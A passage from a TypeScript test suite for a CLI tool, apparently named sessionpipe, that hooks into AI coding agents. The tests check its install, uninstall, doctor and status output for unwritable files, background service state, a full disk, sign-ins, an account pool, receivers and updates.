      unwritable.files.set(settings(), code);
      const { text, err, exit } = await run("install");
      expect(text).toMatch(new RegExp(`! claude-code: .*settings\\.json — can't write it \\(${code}\\); not touched`));
      expect(text).toMatch(/✓ codex: .*hooks\.json written|= codex: .*hooks\.json already current/);
      expect(text).toMatch(/[✓=] codex: .*config\.toml — notify (set at the top level|current)/);
      expect(text).toContain("note: Codex runs non-managed hooks only after you approve them");
      expect(text).toContain("Nothing leaves this computer yet");
      expect(err).not.toHaveBeenCalled();
      expect(exit).not.toHaveBeenCalled();
      expect(process.exitCode).toBeUndefined();
    }
    expect(readFileSync(settings(), "utf8")).toBe("{}\n");
    expect(cfg().harnesses.codex).toMatchObject({ enabled: true, created: [codexHooks()] });
    expect(cfg().harnesses["claude-code"]?.created).toBeUndefined();
    // What isn't hooked is said with its file; what is, by its name (once, for its two files).
    expect(said(await run("status"), "Agents")).toBe("! claude-code: not hooked · ~/.claude/settings.json, codex");
  });

  it("codex: hooks.json written and remembered as created before config.toml is refused", async () => {
    put(codexConfig(), 'model = "o3"\n');
    vi.spyOn(codex, "backfill").mockReturnValue([]);
    unwritable.files.set(codexConfig(), "EACCES");
    const { text } = await run("install", "--codex", "--backfill", "0");
    expect(text).toMatch(/✓ codex: .*hooks\.json written/);
    expect(text).toMatch(
      /! codex: .*config\.toml — can't write it \(EACCES\); not touched\. Codex will report nothing until you approve the hooks/,
    );
    expect(text).not.toContain("note: Codex runs non-managed hooks");
    expect(readFileSync(codexConfig(), "utf8")).toBe('model = "o3"\n');
    expect(cfg().harnesses.codex).toEqual({ enabled: true, created: [codexHooks()] });
  });

  it("a file sessionpipe created that is read-only now: a repeat install reads it as current, a rehook is refused, and `created` is kept", async () => {
    vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    await run("install", "--claude-code", "--backfill", "0");
    expect(cfg().harnesses["claude-code"]).toEqual({ enabled: true, created: [settings()] });
    unwritable.files.set(settings(), "EACCES");
    const again = await run("install", "--claude-code", "--backfill", "0");
    expect(again.text).toMatch(/= claude-code: .*settings\.json already current/);
    // A tier-1 sink wants the full hook set: the rewrite is refused, said, and `created` survives it.
    const full = await run("install", "--claude-code", "--sink", "stdout", "--tier", "1", "--backfill", "0");
    expect(full.text).toMatch(/! claude-code: .*settings\.json — can't write it \(EACCES\); not touched/);
    expect(cfg().harnesses["claude-code"]).toEqual({ enabled: true, created: [settings()] });
    // The one harness asked for was left alone, so nothing was hooked: exit 1 (#185), said.
    expect(full.text).toMatch(/Nothing was hooked/);
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
  });

  it("uninstall: a file it can't write is said so and left; the other harnesses' hooks still come out", async () => {
    put(settings(), {});
    put(codexConfig(), "");
    vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    vi.spyOn(codex, "backfill").mockReturnValue([]);
    await run("install", "--backfill", "0");
    const hooked = readFileSync(settings(), "utf8");
    unwritable.files.set(settings(), "EPERM");
    const { text, err } = await run("uninstall");
    expect(text).toMatch(/! claude-code: .*settings\.json — can't write it \(EPERM\); not touched/);
    expect(text).toMatch(/✓ codex: hooks removed from .*hooks\.json|✓ codex: removed \(sessionpipe created it\)/);
    expect(err).not.toHaveBeenCalled();
    expect(readFileSync(settings(), "utf8")).toBe(hooked);
    expect(existsSync(codexHooks())).toBe(false);
  });

  it("uninstall: a write that fails part way is a `!` line naming the file, never a check mark", async () => {
    put(settings(), {});
    vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    await run("install", "--claude-code", "--backfill", "0");
    unwritable.files.set(settings(), "ENOSPC@write");
    const { text } = await run("uninstall", "--claude-code");
    expect(text).toMatch(
      /! claude-code: .*settings\.json — can't write it \(ENOSPC\) part way; check the file before the harness reads it/,
    );
    expect(text).not.toMatch(/✓ claude-code/);
    expect(readFileSync(settings(), "utf8")).toBe("");
  });
});

describe.skipIf(process.platform === "win32")("doctor and status: the background service and the disk", () => {
  it("not loaded, or loaded and silent: which manager was asked, and the command that starts it there", async () => {
    paired();
    steadyHook();
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    vi.stubEnv("SESSIONPIPE_SERVICE_LABEL", "org.sessionpipe.test");
    const asked: string[] = [];
    let has = false;
    vi.mocked(execFileSync).mockImplementation(((cmd: string, args: string[]) => {
      asked.push([cmd, ...args].join(" "));
      // systemd answers for itself (its version); the service is there only when `has`.
      if (!has && !args.includes("show")) throw new Error("not there");
      return "";
    }) as never);
    // Where launchd or systemd should have the service (its file is there), `update` is
    // what puts it back; with no file nobody asked for one, and a person runs it.
    const start =
      "  1. The background service isn't running, so no message reaches this computer. One command puts it right:";
    const byHandFix = [
      "To fix",
      "  1. The background service isn't running, so no message reaches this computer. Start it, and leave it running:",
      "       sessionpipe control run",
    ];

    // A Mac where launchd has no such service and no plist was written.
    onPlatform("darwin");
    const never = await run("doctor");
    expect(never.text).toMatch(row("✗", "background service", "not loaded: launchd doesn't have it"));
    expect(fixes(never)).toEqual(byHandFix);
    expect(process.exitCode).toBe(1);
    const j = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    expect(j.warnings).toEqual([
      "the control daemon is not running or not responding; polling is stopped",
      "the background service isn't loaded: launchd doesn't have it",
    ]);
    // `status` says the same in its line, and leaves the command to doctor.
    const brief = await run("status");
    expect(said(brief, "This computer")).toMatch(
      /^✗ \S+ \(sessionpipe 0\.0\.0\), background service: not loaded: launchd doesn't have it$/,
    );
    expect(brief.lines.at(-1)).toBe("  `sessionpipe doctor` says what to do about it.");

    // The plist is there and launchd let go of it: the same one command.
    const plist = path.join(home, "Library", "LaunchAgents", "org.sessionpipe.test.plist");
    put(plist, "");
    expect(fixes(await run("doctor"))).toEqual(["To fix", start, "       sessionpipe update"]);

    // launchd has it and nothing answers on the socket: its log is where to look.
    has = true;
    const silent = await run("doctor");
    expect(silent.text).toMatch(row("✗", "background service", "started but not answering"));
    expect(fixes(silent)).toEqual([
      "To fix",
      "  1. The background service was started and doesn't answer, so no message reaches this computer. Its log says why:",
      `       tail -n 20 ${path.join(state, "control", "daemon.log")}`,
    ]);
    expect(JSON.parse((await run("doctor", "--json")).lines.join("\n")).warnings).toEqual([
      "the control daemon is not running or not responding; polling is stopped",
    ]);

    // systemd, with nobody paired (only `ask on` wants the service) and no unit.
    has = false;
    onPlatform("linux");
    paired({ receivers: [], ask: true });
    const byHand = await run("doctor");
    expect(byHand.text).toMatch(row("✗", "background service", "not loaded: systemd doesn't have it"));
    expect(fixes(byHand)).toEqual(byHandFix);
    // The unit is written and not active: the same.
    put(path.join(home, ".config", "systemd", "user", "org.sessionpipe.test.service"), "");
    expect(fixes(await run("doctor"))).toEqual(["To fix", start, "       sessionpipe update"]);

    // Every command of all those runs was a look: nothing was started, stopped or written.
    expect(asked.length).toBeGreaterThan(8);
    for (const a of asked)
      expect(a).toMatch(
        /^(launchctl print (gui|user)\/\d*\/org\.sessionpipe\.test|systemctl --user is-active org\.sessionpipe\.test\.service|systemctl --user show --property=Version$|journalctl --user -u org\.sessionpipe\.test\.service )/,
      );
  });

  it("running: what it has in hand; another version, or one too old to say its own, is a thing to fix", async () => {
    paired();
    const up = (status: Record<string, unknown>) =>
      daemon({ status: { op: "status", status: { receivers: [], ...status } } });
    let close = await up({ version: VERSION, busy: "a headless agent run" });
    try {
      // Fine is named and no more; what it is doing is doctor's to say.
      const brief = await run("status");
      expect(brief.lines[0]).toBe("✓ All good");
      expect(said(brief, "This computer")).toMatch(/^✓ \S+ \(sessionpipe 0\.0\.0\), background service$/);
      steadyHook();
      vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
      onPlatform("darwin");
      const busy = await run("doctor");
      expect(busy.lines[0]).toBe("✓ All good");
      expect(busy.text).toMatch(row("✓", "background service", "running · busy with a headless agent run"));
      // Paired, and the service has not said it asks that receiver yet.
      expect(busy.text).toMatch(row("·", "rx.invalid", "the background service is taking it up · 0 keys trusted"));
    } finally {
      await close();
    }
    for (const [version, runs] of [
      ["0.0.1", "0.0.1"],
      [undefined, "an older release"],
    ] as const) {
      close = await up(version ? { version } : {});
      try {
        steadyHook();
        vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
        onPlatform("darwin");
        const other = await run("doctor");
        expect(other.text).toMatch(
          row("!", "background service", `running sessionpipe ${runs}, and this command is ${VERSION}`),
        );
        expect(fixes(other)).toEqual([
          "To fix",
          `  1. This command is sessionpipe ${VERSION}, and the background service runs ${runs}. One command puts it right:`,
          "       sessionpipe update",
        ]);
        expect(said(await run("status"), "This computer")).toMatch(
          new RegExp(
            `^! \\S+ \\(sessionpipe 0\\.0\\.0\\), background service: running sessionpipe ${quoted(runs)}, and this command is 0\\.0\\.0$`,
          ),
        );
      } finally {
        await close();
      }
    }
  });

  it("a full disk comes first: by what the system says is free, or by what the service's log said this hour", async () => {
    steadyHook();
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    onPlatform("darwin");
    const freeUp = [
      "To fix",
      "  1. This computer's disk is full, so events and messages can't be saved. Free some space, then look again:",
      "       sessionpipe doctor",
    ];
    // Under 16 MB the state can't be relied on to be written.
    disk.free = 5 * 1024 * 1024 + 4096;
    const full = await run("status");
    expect(full.lines[0]).toBe("! 1 thing needs attention");
    expect(said(full, "This computer")).toMatch(/^✗ \S+ \(sessionpipe 0\.0\.0\), disk: full: 5 MB left$/);
    const fullPage = await run("doctor");
    expect(fullPage.text).toMatch(row("✗", "disk", "full: 5 MB left"));
    expect(fixes(fullPage)).toEqual(freeUp);
    // Full now: there is something for the person to do, and the exit code says so.
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    expect(JSON.parse((await run("doctor", "--json")).lines.join("\n")).warnings).toEqual([
      "this computer's disk is full: 5 MB left",
    ]);
    disk.free = 16 * 1024 * 1024;
    expect((await run("status")).lines[0]).toBe("✓ All good");

    // Room again; twelve minutes ago the service could not save, and only its log knows.
    holdClock();
    put(
      path.join(state, "control", "daemon.log"),
      [
        `${minutesAgo(50)} control daemon ${VERSION} up · pid 1 · 1 receiver(s) · socket /x`,
        `${minutesAgo(30)} request failed: ENOSPC: no space left on device, write`,
        `${minutesAgo(12)} pool state not saved: No space left on device`,
        "",
      ].join("\n"),
    );
    const was = await run("doctor");
    expect(was.text).toMatch(row("✗", "disk", "was full 12 min ago, by the background service's log"));
    // It is said and counted, with nothing to type: the disk has room, and an hour of
    // the log saying so must not fail a script that reads the exit code.
    expect(was.lines[0]).toBe("! 1 thing needs attention");
    expect(fixes(was)).toEqual([
      "To fix",
      "  1. This computer's disk was full 12 min ago, and events or messages from then may not have been saved. It has room now: nothing to type.",
    ]);
    expect(process.exitCode).toBeUndefined();
    expect(JSON.parse((await run("doctor", "--json")).lines.join("\n")).warnings).toEqual([
      expect.stringMatching(/^this computer's disk .*was full 12 min ago, by the background service's log$/),
    ]);
    // `status` reads no log: it has only what the system says now.
    const now = await run("status");
    expect(now.lines[0]).toBe("✓ All good");
    expect(now.text).not.toContain("disk");
    // A system that won't say how much is free: the log's word stands on its own.
    disk.free = null;
    expect((await run("doctor")).text).toMatch(
      row("✗", "disk", "was full 12 min ago, by the background service's log"),
    );
    // Neither says anything: no row.
    rmSync(path.join(state, "control", "daemon.log"));
    const quiet = await run("doctor");
    expect(quiet.text).not.toMatch(/^ {2}. disk /m);
    expect(quiet.lines[0]).toBe("✓ All good");
  });
});

describe.skipIf(process.platform === "win32")("doctor: accounts", () => {
  const dirs = [".claude", ".claude-second", ".claude-odd"];
  const accounts = () => {
    for (const d of dirs) put(path.join(home, d, "settings.json"), {});
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
  };

  it("a sign-in is the background service's own answer where it gives one, and this shell's where it doesn't", async () => {
    accounts();
    paired();
    steadyHook();
    // The service sees the opposite of what this shell does (a login keychain, over ssh),
    // and can't tell for the third: only that one is asked of this shell's `claude`.
    const close = await daemon({
      status: {
        op: "status",
        status: {
          version: VERSION,
          receivers: [
            { url: "https://rx.invalid", polling: true, last_poll: 1, last_error: null, last_poll_age_ms: 0 },
          ],
        },
      },
      health: {
        op: "health",
        health: {
          accounts: [
            { dir: path.join(home, ".claude"), signed_in: false },
            { dir: path.join(home, ".claude-second"), signed_in: true },
            { dir: path.join(home, ".claude-odd"), signed_in: null },
          ],
          keys: [{ url: "https://rx.invalid", readable: true }],
        },
      },
    });
    try {
      onPlatform("darwin");
      const mac = await run("doctor");
      expect(group(mac, "Accounts")).toEqual([
        "  ✗ Claude Code ~/.claude         not signed in, as the background service sees it",
        "  · Claude Code ~/.claude-odd     couldn't tell: `claude auth status` gave no answer",
        "  ✓ Claude Code ~/.claude-second  signed in",
      ]);
      expect(fixes(mac)).toEqual([
        "To fix",
        "  1. Claude Code ~/.claude isn't signed in where the background service runs, so a message can't start a session with it. A Mac keeps the sign-in in the login keychain: log in at this computer's screen, then:",
        "       claude auth login",
      ]);
      // Elsewhere a login from any shell will do.
      onPlatform("linux");
      vi.mocked(execFileSync).mockReturnValue("Linger=yes\n");
      expect(fixes(await run("doctor"))).toEqual([
        "To fix",
        "  1. Claude Code ~/.claude isn't signed in, so a message can't start a session with it. Sign in:",
        "       claude auth login",
      ]);
      const j = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
      expect(j.claude_accounts).toEqual([
        { dir: "~/.claude", signed_in: false },
        { dir: "~/.claude-odd", signed_in: null },
        { dir: "~/.claude-second", signed_in: true },
      ]);
      expect(j.warnings).toEqual(["Claude Code ~/.claude isn't signed in from here: `claude auth login`"]);
    } finally {
      await close();
    }
  });

  it("over ssh on a Mac this shell's 'not signed in' says nothing, so it is no thing to fix; elsewhere it is", async () => {
    accounts();
    paired();
    steadyHook();
    const up = await daemon({
      status: {
        op: "status",
        status: {
          version: VERSION,
          receivers: [
            { url: "https://rx.invalid", polling: true, last_poll: 1, last_error: null, last_poll_age_ms: 0 },
          ],
        },
      },
    });
    try {
      vi.stubEnv("SSH_CONNECTION", "10.0.0.1 1 10.0.0.2 22");
      onPlatform("darwin");
      const mac = await run("doctor");
      expect(group(mac, "Accounts")).toEqual([
        "  ✓ Claude Code ~/.claude         signed in",
        "  · Claude Code ~/.claude-odd     couldn't tell: `claude auth status` gave no answer",
        "  · Claude Code ~/.claude-second  can't tell over ssh: a Mac keeps the sign-in in its login keychain",
      ]);
      expect(mac.lines[0]).toBe("✓ All good");
      expect(process.exitCode).toBeUndefined();
      onPlatform("linux");
      vi.mocked(execFileSync).mockReturnValue("Linger=yes\n");
      const linux = await run("doctor");
      expect(linux.text).toMatch(row("!", "Claude Code ~/.claude-second", "not signed in, as this shell sees it"));
      expect(fixes(linux)).toEqual([
        "To fix",
        "  1. Claude Code ~/.claude-second isn't signed in, so a message can't start a session with it. Sign in:",
        "       CLAUDE_CONFIG_DIR=~/.claude-second claude auth login",
      ]);
    } finally {
      await up();
    }
  });

  it("the pool: on or off, how many accounts have room, and when it had none to give", async () => {
    const account = (n: number) => ({
      id: `0a1b2c3${n}`,
      email: `a${n}@x.y`,
      account_uuid: `0a1b2c3${n}-0000-4000-8000-000000000000`,
      enabled: true,
      added_at: "2026-10-29T10:00:00.000Z",
    });
    const pool = (on: boolean, n: number) =>
      put(path.join(tmp, "config", "pool.json"), { on, port: 4141, accounts: [0, 1].slice(0, n).map(account) });
    const up = (p: Record<string, unknown>) =>
      daemon({
        status: {
          op: "status",
          status: {
            version: VERSION,
            receivers: [],
            pool: { on: true, port: 4141, listening: true, accounts: 2, with_room: 0, in_flight: 0, ...p },
          },
        },
      });
    const refused = [
      "  1. Every pooled Claude account is at its limit or signed out, so Claude Code sessions here were refused. See which, and when each has room again:",
      "       sessionpipe pool",
    ];
    steadyHook();
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    onPlatform("darwin");

    // On, two accounts, and the service says neither has room.
    pool(true, 2);
    let close = await up({});
    try {
      const none = await run("doctor");
      expect(none.text).toMatch(row("!", "pool", "on · 2 accounts · 0 with room left"));
      expect(fixes(none)).toEqual(["To fix", ...refused]);
      expect(JSON.parse((await run("doctor", "--json")).lines.join("\n")).warnings).toEqual([
        "the pool has no account with room left: Claude Code sessions here are being refused",
      ]);
      const brief = await run("status");
      expect(brief.lines[0]).toBe("! 1 thing needs attention");
      expect(said(brief, "Accounts")).toBe("! pool: on · 2 accounts · 0 with room left");
    } finally {
      await close();
    }
    // One has room: all good, and `status` only names it.
    close = await up({ with_room: 1 });
    try {
      const room = await run("doctor");
      expect(room.lines[0]).toBe("✓ All good");
      expect(room.text).toMatch(row("✓", "pool", "on · 2 accounts · 1 with room left"));
      expect(said(await run("status"), "Accounts")).toBe("✓ pool");
    } finally {
      await close();
    }
    // On with no account yet: nobody to be out of room.
    pool(true, 0);
    close = await up({ accounts: 0 });
    try {
      const empty = await run("doctor");
      expect(empty.lines[0]).toBe("✓ All good");
      expect(empty.text).toMatch(row("✓", "pool", "on · 0 accounts · 0 with room left"));
    } finally {
      await close();
    }
    // Off: the accounts are counted and nothing else is said, whatever the service holds.
    pool(false, 1);
    close = await up({ on: false, accounts: 1, with_room: 1 });
    try {
      expect((await run("doctor")).text).toMatch(row("·", "pool", "off · 1 account"));
    } finally {
      await close();
    }

    // With no service to ask, what its log wrote down this hour: sessions it had to refuse.
    pool(true, 2);
    holdClock();
    const log = path.join(state, "control", "daemon.log");
    put(log, `${minutesAgo(9)} no account could be tried (session 1234abcd)\n`);
    const once = await run("doctor");
    expect(once.text).toMatch(row("!", "pool", "on · 2 accounts · had none to try 1 time in the last hour"));
    expect(fixes(once)).toEqual([
      "To fix",
      "  1. The background service isn't running, so no message reaches this computer. Start it, and leave it running:",
      "       sessionpipe control run",
      refused[0]?.replace("1.", "2."),
      refused[1],
    ]);
    put(
      log,
      `${minutesAgo(9)} no account could be tried (session 1)\n${minutesAgo(3)} no account could be tried (session 2)\n`,
    );
    expect((await run("doctor")).text).toMatch(
      row("!", "pool", "on · 2 accounts · had none to try 2 times in the last hour"),
    );
    // `status` reads no log: the pool is on, and that is all it knows.
    expect(said(await run("status"), "Accounts")).toBe("✓ pool");
  });
});

describe.skipIf(process.platform === "win32")(
  "doctor and status: receivers, sinks, updates and the hooks' own copy",
  () => {
    it("each receiver: heard, taken up, forgotten by it (401), a key the service can't read, or no answer", async () => {
      steadyHook();
      vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
      onPlatform("darwin");
      const rx = (name: string, keys: number) => ({
        url: `https://${name}.test`,
        machine: "m",
        token: "t",
        keys: Array.from({ length: keys }, (_, i) => ({ id: `k${i}` })),
      });
      paired({
        folders: ["/p", "/q"],
        mode: "inherit",
        receivers: [rx("live", 1), rx("gone", 0), rx("locked", 0), rx("slow", 0), rx("quiet", 0), rx("new", 2)],
      });
      const forgotten = "the receiver no longer knows this machine (401); run `sessionpipe control pair` again";
      const unread = "can't read this machine's token from keychain (locked?); retrying every 30 s";
      // Every age is the service's own word, so nothing here reads the clock.
      const close = await daemon({
        status: {
          op: "status",
          status: {
            version: VERSION,
            receivers: [
              { url: "https://live.test", polling: true, last_poll: 1, last_error: null, last_poll_age_ms: 10_000 },
              {
                url: "https://gone.test",
                polling: false,
                last_poll: 1,
                last_error: forgotten,
                last_poll_age_ms: 3480 * 60_000,
              },
              {
                url: "https://locked.test",
                polling: false,
                last_poll: null,
                last_error: unread,
                last_poll_age_ms: 120_000,
              },
              {
                url: "https://slow.test",
                polling: true,
                last_poll: 1,
                last_error: "fetch failed",
                last_poll_age_ms: 300_000,
              },
              { url: "https://quiet.test", polling: false, last_poll: null, last_error: null },
              // Still asked by the service, and no longer in control.json.
              { url: "https://old.test", polling: true, last_poll: null, last_error: null },
            ],
          },
        },
      });
      try {
        const rows = [
          "  ✓ live.test             live · heard 10 s ago · 1 key trusted",
          "  ✗ gone.test             not live: it no longer knows this computer",
          "  ✗ locked.test           not live for 2 min: the background service can't read this computer's key",
          "  ✗ slow.test             not live for 5 min: fetch failed",
          "  ✗ quiet.test            not live: no answer",
          "  · new.test              the background service is taking it up · 2 keys trusted",
          "  ✓ old.test              live · just connected · 0 keys trusted",
          "  · sessions you message  run in inherit mode, in 2 folders",
        ];
        // `status`: who is heard by name, who isn't with why; the one being taken up is doctor's.
        const seen = await run("status");
        expect(seen.lines[0]).toBe("! 4 things need attention");
        expect(said(seen, "Messages from")).toBe(
          "✗ live.test, gone.test: not live: it no longer knows this computer, locked.test: not live for 2 min: the background service can't read this computer's key, slow.test: not live for 5 min: fetch failed, quiet.test: not live: no answer, old.test",
        );
        const d = await run("doctor");
        expect(group(d, "Messages from")).toEqual(rows);
        // What to type comes before what only needs waiting for.
        expect(fixes(d)).toEqual([
          "To fix",
          "  1. gone.test no longer knows this computer, so its messages can't arrive. Pair with it again:",
          "       sessionpipe control pair https://gone.test",
          "  2. The background service can't read this computer's key for locked.test: the keychain it is in is locked, or nobody is logged in at this computer's screen. Log in there once, or keep the keys in a file it can always read:",
          "       sessionpipe secrets move file",
          "  3. slow.test hasn't answered for 5 min. Messages wait there, and the background service keeps trying: nothing to type unless it stays this way.",
          "  4. quiet.test hasn't answered. Messages wait there, and the background service keeps trying: nothing to type unless it stays this way.",
        ]);
        // A program gets each in the words it always had, and nothing for the ones that are fine.
        expect(JSON.parse((await run("doctor", "--json")).lines.join("\n")).warnings).toEqual([
          `https://gone.test: the daemon has not polled for 3480 minutes: ${forgotten}`,
          `https://locked.test: the daemon has not polled for 2 minutes: ${unread}`,
          "https://slow.test: the daemon has not polled for 5 minutes: fetch failed",
          "https://quiet.test: the daemon has never polled: polling stopped",
        ]);
      } finally {
        await close();
      }
    });

    it("one session waiting and two hook events queued: counted in the singular and the plural", async () => {
      writeConfig({ sinks: [{ name: "out", url: "stdout", tier: 0 }], harnesses: {} } as never);
      new Outbox(state).append({ harness: "claude-code", session: "s1" }, [event("session.heartbeat", {})]);
      put(path.join(state, "jobs", "a.json"), {});
      put(path.join(state, "jobs", "b.json"), {});
      steadyHook();
      vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
      expect(group(await run("doctor"), "Reports to")).toEqual([
        "  ✓ out              tier 0 · 1 session waiting to be sent",
        "  · still to handle  2 hook events waiting on this computer",
      ]);
      // Waiting is not wrong: `status` names the sink and no more.
      const brief = await run("status");
      expect(brief.lines[0]).toBe("✓ All good");
      expect(said(brief, "Reports to")).toBe("✓ out");
    });

    it("updates: automatic with what the last check found, what waits for an idle moment, what failed, what was done", async () => {
      paired();
      // A global install this user can write: the background service updates it by itself.
      const prefix = path.join(tmp, "prefix");
      mkdirSync(path.join(prefix, "lib", "node_modules"), { recursive: true });
      vi.mocked(globalPrefix).mockReturnValue(prefix);
      holdClock();
      steadyHook();
      vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
      onPlatform("darwin");
      const updates = async (rec: Record<string, unknown>) => {
        put(path.join(state, "control", "update.json"), rec);
        return group(await run("doctor"), "Updates");
      };
      expect(await updates({})).toEqual(["  ✓ automatic  once a day; not checked yet"]);
      expect(await updates({ checked_at: minutesAgo(180), latest: "9.9.9" })).toEqual([
        "  ✓ automatic  checked 3 h ago: 9.9.9 is the newest",
      ]);
      expect(await updates({ checked_at: minutesAgo(180) })).toEqual([
        "  ✓ automatic  checked 3 h ago: ? is the newest",
      ]);
      expect(await updates({ checked_at: minutesAgo(5), error: "ENOTFOUND registry.npmjs.org" })).toEqual([
        "  ✓ automatic  the check 5 min ago failed: ENOTFOUND registry.npmjs.org",
      ]);
      expect(await updates({ checked_at: minutesAgo(180), latest: "9.9.9", pending: "9.9.9" })).toEqual([
        "  ✓ automatic  checked 3 h ago: 9.9.9 is the newest",
        "  · waiting    9.9.9 is installed once the background service is idle",
      ]);
      const updated = { from: "0.1.0", to: "0.2.0", at: minutesAgo(2 * 24 * 60), ms: 1 };
      expect(await updates({ updated })).toEqual([
        "  ✓ automatic    once a day; not checked yet",
        "  · last update  0.1.0 → 0.2.0, 2 days ago",
      ]);
      // An install that failed is said instead of the last one that worked, and is a thing to fix.
      const failed = { version: "9.9.9", at: minutesAgo(60), error: "npm install: EACCES" };
      expect(await updates({ updated, failed })).toEqual([
        "  ✓ automatic  once a day; not checked yet",
        "  ! failed     installing 9.9.9 60 min ago: npm install: EACCES",
      ]);
      expect(fixes(await run("doctor"))).toEqual([
        "To fix",
        "  1. The background service isn't running, so no message reaches this computer. Start it, and leave it running:",
        "       sessionpipe control run",
        "  2. The background service couldn't install sessionpipe 9.9.9 by itself. Do it now:",
        "       sessionpipe update",
      ]);
      // `status`: that it is automatic, and what failed; what waits or was done is doctor's.
      expect(said(await run("status"), "Updates")).toBe(
        "! automatic, failed: installing 9.9.9 60 min ago: npm install: EACCES",
      );
      put(path.join(state, "control", "update.json"), { updated, pending: "9.9.9" });
      expect(said(await run("status"), "Updates")).toBe("✓ automatic");
      // Nobody paired: the service that would update isn't set up. A program reads why in
      // the words `update.off` has always had; a person in the words of the rest of the page.
      rmSync(path.join(tmp, "config", "control.json"));
      expect(group(await run("doctor"), "Updates")[0]).toBe(
        "  · by hand      it runs in the background service, which isn't set up here (`sessionpipe connect`)",
      );
      for (const cmd of ["doctor", "status"])
        expect(JSON.parse((await run(cmd, "--json")).lines.join("\n")).update.off).toBe(
          "it runs in the control daemon, which isn't set up here (`sessionpipe connect`)",
        );
    });

    it("the hooks' own copy: run by another version, naming a node that is gone, or missing a file", async () => {
      put(path.join(home, ".claude", "settings.json"), {});
      vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
      await run("install", "--claude-code", "--backfill", "0");
      const launcher = path.join(tmp, "data", "sessionpipe-hook");
      const written = readFileSync(launcher, "utf8");
      steadyHook();
      vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
      const hooks = async () => /^ {2}(. hooks .*)$/m.exec((await run("doctor")).text)?.[1];
      // `status` names them when they are fine, and says what is wrong when they aren't.
      const brief = async () => said(await run("status"), "This computer")?.replace(/^(.) .*?\), /, "$1 ");
      expect(await brief()).toBe("✓ hooks");
      expect(await hooks()).toBe(`✓ hooks               run sessionpipe ${VERSION}`);
      // A launcher from before it said its version is taken to be this one's.
      writeFileSync(
        launcher,
        written.replace(`# sessionpipe ${VERSION} hook launcher`, "# sessionpipe's hook launcher"),
      );
      expect(await hooks()).toBe(`✓ hooks               run sessionpipe ${VERSION}`);
      writeFileSync(launcher, written.replace(`# sessionpipe ${VERSION} hook`, "# sessionpipe 99.0.0 hook"));
      expect(await hooks()).toBe(`! hooks               run sessionpipe 99.0.0, and this command is ${VERSION}`);
      expect(await brief()).toBe(`! hooks: run sessionpipe 99.0.0, and this command is ${VERSION}`);
      const gone = path.join(tmp, "gone", "node");
      writeFileSync(launcher, written.replace(/^n='.*'$/m, `n='${gone}'`));
      expect(await hooks()).toBe(`! hooks               name a node that is gone (${gone})`);
      // A launcher that names no node at all.
      writeFileSync(launcher, written.replace(/^n='.*'$/m, ""));
      expect(await hooks()).toBe("! hooks               name a node that is gone (?)");
      writeFileSync(launcher, written);
      rmSync(path.join(tmp, "data", "worker.js"));
      expect(await hooks()).toBe("! hooks               are missing a file");
      // Whatever is wrong with it, the hooks are written again from this copy.
      expect(fixes(await run("doctor"))).toEqual([
        "To fix",
        "  1. The hooks are missing a file. Write them again from this copy:",
        "       sessionpipe install",
      ]);
    });
  },
);

describe.skipIf(process.platform === "win32")("doctor's exit code", () => {
  /** This computer with its hooks written and nothing else to say. */
  async function hooked(): Promise<void> {
    put(path.join(home, ".claude", "settings.json"), {});
    vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    await run("install", "--claude-code", "--backfill", "0");
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    onPlatform("darwin");
  }
  /** The hook's eight timed runs take `ms` each by this clock: no real hook is timed. */
  function hookTakes(ms: number): void {
    let tick = 0n;
    vi.spyOn(process.hrtime, "bigint").mockImplementation(() => (tick += BigInt(ms) * 1_000_000n));
  }

  it("a slow hook is said and counted, and is nothing to run: the code stays 0 however loaded the machine", async () => {
    await hooked();
    hookTakes(400);
    const slow = await run("doctor");
    expect(slow.lines[0]).toBe("! 1 thing needs attention");
    expect(slow.text).toContain("  ! hook speed          400 ms each (95 in 100 under 400 ms)\n");
    expect(fixes(slow)).toEqual([
      "To fix",
      "  1. Each hook takes 400 ms, which is Node starting up on this computer; agents wait that long many times a turn. With no sink above tier 0, fewer events are hooked.",
    ]);
    expect(process.exitCode).toBeUndefined();
    // The same computer a moment later, with the hook quick again: the same code.
    hookTakes(3);
    const quick = await run("doctor");
    expect(quick.lines[0]).toBe("✓ All good");
    expect(process.exitCode).toBeUndefined();
  });

  it("a receiver that hasn't answered yet, and hooks an agent's own setting turns off: counted, nothing to run, 0", async () => {
    await hooked();
    hookTakes(3);
    paired({ receivers: [{ url: "https://slow.test", machine: "m", token: "t", keys: [] }] });
    const close = await daemon({
      status: {
        op: "status",
        status: {
          version: VERSION,
          receivers: [
            {
              url: "https://slow.test",
              polling: true,
              last_poll: 1,
              last_error: "fetch failed",
              last_poll_age_ms: 300_000,
            },
          ],
        },
      },
    });
    try {
      const waiting = await run("doctor");
      expect(waiting.lines[0]).toBe("! 1 thing needs attention");
      expect(fixes(waiting)).toEqual([
        "To fix",
        "  1. slow.test hasn't answered for 5 min. Messages wait there, and the background service keeps trying: nothing to type unless it stays this way.",
      ]);
      expect(process.exitCode).toBeUndefined();
      vi.spyOn(claudeCode, "installed").mockReturnValue([
        { file: path.join(home, ".claude", "settings.json"), state: "inactive", note: "hooks are off" },
      ]);
      const off = await run("doctor");
      expect(off.lines[0]).toBe("! 2 things need attention");
      expect(fixes(off).filter((l) => l.startsWith("       "))).toEqual([]);
      expect(process.exitCode).toBeUndefined();
    } finally {
      await close();
    }
  });

